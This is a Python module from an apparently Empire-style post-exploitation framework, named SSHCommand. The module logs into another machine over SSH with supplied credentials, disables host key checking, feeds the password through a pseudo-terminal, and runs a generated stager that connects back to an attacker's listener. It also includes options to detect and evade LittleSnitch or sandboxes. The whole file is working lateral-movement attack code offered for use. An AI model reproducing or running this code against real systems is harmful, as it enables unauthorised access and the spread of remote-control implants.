from lib.common import helpers

class Module:
    def __init__(self, mainMenu, params=[]):
        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'SSHCommand',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': 'This module will send an launcher via ssh.',

            # True if the module needs to run in the background
            'Background' : True,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                'http://stackoverflow.com/questions/17118239/how-to-give-subprocess-a-password-and-get-stdout-at-the-same-time'
                            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to use ssh from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Login' : {
                'Description'   :   'user@127.0.0.1',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        login = self.options['Login']['Value']
        password = self.options['Password']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.replace("'", "\\'")
        launcher = launcher.replace('"', '\\"')
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        script = """
import os
import pty

def wall(host, pw):
    import os,pty
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '%s'])
        os._exit(1)

    os.read(fd, 1024)
    os.write(fd, '\\n' + pw + '\\n')

    result = []
    while True:
        try:
            data = os.read(fd, 1024)
            if data[:8] == "Password" and data[-1:] == ":":
                os.write(fd, pw + '\\n')

        except OSError:
            break
        if not data:
            break
        result.append(data)
    pid, status = os.waitpid(pid, 0)
    return status, ''.join(result)

status, output = wall('%s','%s')
print status
print output

""" % (launcher, login, password)
        return script
